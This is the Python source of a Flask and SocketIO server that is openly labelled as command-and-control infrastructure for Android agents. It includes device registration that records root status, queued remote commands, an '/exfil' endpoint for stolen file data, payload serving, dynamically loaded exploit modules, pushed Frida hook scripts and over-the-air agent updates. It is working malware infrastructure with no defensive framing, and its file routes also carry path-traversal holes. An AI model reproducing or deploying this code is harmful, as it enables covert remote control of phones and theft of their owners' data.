import eventlet
eventlet.monkey_patch()

from flask import Flask, request, jsonify, abort, send_file, render_template
from flask_cors import CORS
from flask_socketio import SocketIO, emit
import os
import json
import time
import base64
import subprocess
from sys import stderr
from token_utils import verify_signature, register_token, get_device_token, rotate_token

app = Flask(__name__)
CORS(app)
socketio = SocketIO(app, cors_allowed_origins="*")

# In-memory command queue for demo (replace with DB in production)
command_queue = {}
result_store = {}
connected_agents = {}
agent_sockets = {}
agent_telemetry = {}

# === Auth Middleware (disabled temporarily for dev/testing) ===
@app.before_request
def check_auth():
    if request.path.startswith(("/get_command", "/set_command", "/post_output")):
        agent_id = request.headers.get("X-Agent-ID")
        sig = request.headers.get("X-Signature")
        if not agent_id or not sig or not verify_signature(sig, agent_id):
            abort(403)

# === Web Dashboard ===
@app.route("/")
def dashboard():
    return render_template("index.html")

# === Agent Registration ===
def register_device(device_id, meta):
    connected_agents[device_id] = {
        "manufacturer": meta.get("manufacturer", "unknown"),
        "model": meta.get("model", "unknown"),
        "rooted": meta.get("rooted", "unknown"),
        "last_seen": time.time()
    }

@app.route("/register", methods=["POST"])
def register():
    data = request.json
    device_id = data.get("device_id")
    token = register_token(device_id)
    register_device(device_id, data)
    print(f"[+] Registered Agent: {device_id} {connected_agents[device_id]}")
    return jsonify({"status": "registered", "token": token})

# === Token Management ===
@app.route("/token/<device_id>", methods=["GET"])
def get_token_for_device(device_id):
    token = get_device_token(device_id)
    if token:
        return jsonify({"device_id": device_id, "token": token})
    return jsonify({"error": "Token not found"}), 404

@app.route("/token/rotate/<device_id>", methods=["POST"])
def rotate_token_for_device(device_id):
    new_token = rotate_token(device_id)
    return jsonify({"device_id": device_id, "new_token": new_token})

# === View All Registered Agents ===
@app.route("/agents", methods=["GET"])
def list_agents():
    now = time.time()
    agents = []
    for device_id, meta in connected_agents.items():
        meta_copy = meta.copy()
        meta_copy["device_id"] = device_id
        meta_copy["online"] = (now - meta["last_seen"]) < 60
        meta_copy["telemetry"] = agent_telemetry.get(device_id, {})
        agents.append(meta_copy)
    return jsonify(agents)

@app.route("/exported_telemetry/<device_id>", methods=["GET"])
def export_telemetry(device_id):
    telemetry = agent_telemetry.get(device_id)
    if not telemetry:
        return jsonify({"error": "No telemetry available"}), 404
    filepath = os.path.join("uploads", f"{device_id}_telemetry.json")
    os.makedirs("uploads", exist_ok=True)
    with open(filepath, "w") as f:
        json.dump(telemetry, f, indent=2)
    return send_file(filepath, mimetype="application/json", as_attachment=True)

# === Poll-based C2 commands ===
@app.route("/api/send_command", methods=["POST"])
def send_command_to_agent():
    data = request.json
    device_id = data["device_id"]
    command = data["command"]
    args = data["args"]
    command_queue[device_id] = (command, args)
    return jsonify({"status": "queued"})

@app.route("/get_command/<device_id>", methods=["GET"])
def get_command_for_agent(device_id):
    if device_id in command_queue:
        command, args = command_queue.pop(device_id)
        return jsonify({"command": command, "args": args})
    return jsonify({"command": None})

@app.route("/api/submit_result", methods=["POST"])
def receive_result():
    data = request.json
    device_id = data["device_id"]
    result = data["result"]
    # Save result for later retrieval or print/log
    result_store[device_id] = result
    return jsonify({"status": "received"})

@app.route("/api/get_result/<device_id>")
def get_result(device_id):
    return jsonify({"result": result_store.get(device_id)})

# === Manual Output & Command Endpoint (for debugging) ===
@app.route("/post_output", methods=["POST"])
def post_output():
    data = request.json
    device_id = data.get("device_id")
    output = data.get("output")
    command_queue[device_id] = output
    connected_agents[device_id]["last_seen"] = time.time()
    print(f"[<] Output from {device_id}:\n{output}")
    return jsonify({"status": "ok"})

@app.route("/set_command", methods=["POST"])
def set_command():
    data = request.json
    device_id = data.get("device_id")
    command = data.get("command")
    command_queue[device_id] = command
    print(f"[!] Command for {device_id} set to: {command}")
    return jsonify({"status": "command set"})

# === File Exfiltration ===
@app.route("/exfil", methods=["POST"])
def receive_file():
    content = request.data.decode()
    print(f"\n[EXFIL] Received file data:\n{content}\n")
    return jsonify({"status": "received"})

# === Dynamic Exploit Module Execution ===
@app.route("/exploit/<module_name>", methods=["POST"])
def generic_exploit(module_name):
    try:
        data = request.json
        device_id = data.get("device_id")
        package = data.get("package")
        component = data.get("component") 
        module = __import__(f"modules.{module_name}", fromlist=["generate_command"])
        command = module.generate_command(package, component)
        command_queue[device_id] = (command , {})
        return jsonify({"status": "queued", "command": command})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# === Payload Serving ===
@app.route("/payloads/<filename>", methods=["GET"])
def get_payload(filename):
    payload_path = os.path.join("payloads", filename)
    if not os.path.exists(payload_path):
        return {"error": "File not found"}, 404
    return send_file(payload_path, mimetype="application/octet-stream")

# === File Upload Support to Server ===
@app.route("/upload", methods=["POST"])
def upload():
    file = request.files["file"]
    os.makedirs("uploads", exist_ok=True)
    file.save(os.path.join("uploads", file.filename))
    return jsonify({"status": "ok"})

# === Frida Hooks ===
@app.route("/frida_hooks", methods=["POST"])
def push_frida_hook():
    data = request.json
    device_id = data.get("device_id")
    hook_script = data.get("script_name")
    sid = agent_sockets.get(device_id)
    path = os.path.join("frida_hooks", hook_script)
    if not os.path.exists(path):
        return jsonify({"error": "Hook file not found"}), 404
    if sid:
        with open(path, "r") as f:
            js_code = f.read()
        socketio.emit("load_frida_script", {"script": js_code}, to=sid)
        return jsonify({"status": "hook sent"})
    return jsonify({"error": "Agent not connected"}), 404

# === Track heartbeat/ping ===
@app.route("/check_update", methods=["POST"])
def check_update():
    data = request.json
    device_id = data.get("device_id")
    current_version = data.get("version")

    # These should be updated in your CI/CD or manually
    latest_dex = "update.dex"
    latest_apk = "mmagent.apk"
    latest_version = "2.0"
    if current_version != latest_version:
        return jsonify({
            "update_available": True,
            "type": "dex",  # or "apk"
            "filename": latest_dex,
            "version": latest_version
        })
    return jsonify({"update_available": False})

# === Flask Base64 File Upload ===
@app.route("/upload_base64", methods=["POST"])
def upload_base64():
    data = request.json
    filename = data.get("filename")
    filedata = data.get("date")
    if not filename or not filedata: 
        return jsonify({"error": "Missing filenmae or data"}), 400
    try:
        os.makedirs("upload", exist_ok=True)
        with open(os.path.join("uploads", filename), "wb") as f:
            f.write(base64.b64decode(filedata))
        return jsonify({"status": "uploaded"})
    except Exception as e:
        return jsonify({"error": str (e)}), 500

# === Flask Base64 File Download ===
@app.route("/download_base64/<filename>", methods=["GET"])
def download_base64(filename):
    filepath = os.path.join("uploads", filename)
    if not os.path.exists(filepath):
        return jsonify({"error": "File not found"}), 404
    try:
        with open(filepath, "rb") as f:
            encoded = base64.b64encode(f.read()).decode()
        return jsonify({"filename": filename, "data": encoded})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# === Incorporate Dyna.py in the UI ===
@app.route("/run_dyna", methods=["POST"])
def run_dyna():
    data = request.json
    apk_path = data.get("apk_path")
    package_name = data.get("package_name")
    if not all([apk_path, package_name]):
        return jsonify({"status": "error", "message": "Missing apk_path or package_name"}), 400
    try:
        result = subprocess.check_output(
            ["python3", "dyna.py", "--apk", apk_path, "--pkg", package_name, "--format", "html"],
            stderr=subprocess.STDOUT
        ).decode()
        return jsonify({"status": "success", "output": result})
    except subprocess.CalledProcessError as e:
        return jsonify({
            "status": "error",
            "command": e.cmd,
            "returncode": e.returncode,
            "output": e.output.decode(errors="ignore")
        }), 500

# === WebSocket Event Handling ===
@socketio.on('connect')
def on_connect():
    print("[✓] Agent connected via WebSocket")

@socketio.on('disconnect')
def on_disconnect():
    # Optional: cleanup logic or print info
    print(f"[!] A client disconnected")

@socketio.on('register')
def register_agent(data):
    device_id = data.get("device_id")
    register_device(device_id, data)
    agent_sockets[device_id] = request.sid
    emit('agent_list', connected_agents, broadcast=True)
    print(f"[+] WebSocket Agent registered: {device_id}")

@socketio.on("register_progress_listener")
def handle_progress_listener(data):
    device_id = data.get("device_id")
    agent_sockets[device_id] = request.sid

@socketio.on('command_result')
def on_command_result(data):
    device_id = data.get("device_id")
    result = data.get("result")
    if isinstance(result, dict):
        agent_telemetry[device_id] = result
        print(f"[Recon from {device_id}] {json.dumps(result, indent=2)}")
    else:
        print(f"[<] Output from {device_id}:\n{result}")
    result_store[device_id] = result

@socketio.on('send_command')
def send_command(data):
    device_id = data.get("device_id")
    command = data.get("command")
    args = data.get("args", {})
    if device_id and command:
        command_queue[device_id] = command
        sid = agent_sockets.get(device_id)
        if sid:
            emit('command', {'cmd': command, 'args': args}, to=sid)
        print(f"[>] Sent to {device_id}: {command}")

# === Start Server ===
if __name__ == "__main__":
    socketio.run(app, host="0.0.0.0", port=5000)
